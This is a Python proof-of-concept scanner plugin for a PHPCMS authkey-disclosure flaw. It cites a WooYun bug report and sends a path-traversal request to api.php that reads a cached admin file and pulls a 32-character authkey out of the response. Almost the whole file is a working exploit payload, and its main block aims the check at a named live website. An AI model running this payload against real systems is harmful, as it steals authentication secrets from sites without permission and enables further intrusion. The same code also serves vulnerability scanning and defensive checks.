#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
"""
POC Name  :  PHPCMS最新版本authkey泄露
References:  http://wooyun.org/bugs/wooyun-2015-0105242
Author    :  13
QQ        :  779408317
"""
def assign(service, arg):
    if service == "phpcms":
        return True, arg

def audit(arg):
    payload = 'api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\\applist&path=admin'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    m = re.search('(\w{32})',res)
    if code == 200 and m:
        security_hole(m.group(1))

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpcms', 'http://phpcms.cuplayer.net/')[1])